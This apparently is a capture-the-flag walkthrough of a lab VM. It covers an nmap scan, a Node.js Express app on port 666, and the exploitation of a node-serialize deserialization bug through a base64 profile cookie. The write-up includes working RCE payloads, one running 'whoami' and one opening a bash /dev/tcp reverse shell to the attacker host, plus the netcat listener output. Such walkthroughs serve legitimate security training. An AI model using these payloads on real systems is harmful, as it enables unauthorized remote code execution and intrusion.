

Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap scan report for 192.168.56.103
Host is up (0.00088s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 95:68:04:c7:42:03:04:cd:00:4e:36:7e:cd:4f:66:ea (RSA)
|   256 c3:06:5f:7f:17:b6:cb:bc:79:6b:46:46:cc:11:3a:7d (ECDSA)
|_  256 63:0c:28:88:25:d5:48:19:82:bb:bd:72:c6:6c:68:50 (ED25519)
666/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
MAC Address: 08:00:27:BB:24:1C (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~




~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# curl http://192.168.56.103:666
Under Construction, Come Back Later!
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


After running the request through Burp we can see the Cookie has a value for profile
After decoding it we get  
![Alt Tag]()


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{"username":"Admin","csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires=":Friday, 13 Oct 2018 00:00:00 GMTIn0%3D
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We change the profile value, in {"username":"Admin"}, Base 64 encode it and resubmit it to the server.
![Alt Tag]()

We take a look at some serialization with node js
Resource for RCE NODE.js serialization .
https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

We change the value of the cookie

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{"username":"_$$ND_FUNC$$_function(){return require('child_process').execSync('whoami',(e,out,err)=>{console.log(out);}); }()"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


After resubmitting the request with this payload we can see that we are running commands on the server, as user : nodeadmin
![Alt Tag]()


Trying to get a reverse shell on the server:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{"username":"_$$ND_FUNC$$_function(){return require('child_process').execSync('bash -i >& /dev/tcp/192.168.56.102/1234 0>&1',(e,out,err)=>{console.log(out);}); }()"}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![Alt Tag]()


Sending this to repeater we get a reverse shell on the listening 1234 port open on Kali.


![Alt Tag]()


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 44214
bash: cannot set terminal process group (814): Inappropriate ioctl for device
bash: no job control in this shell
[nodeadmin@localhost ~]$ 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
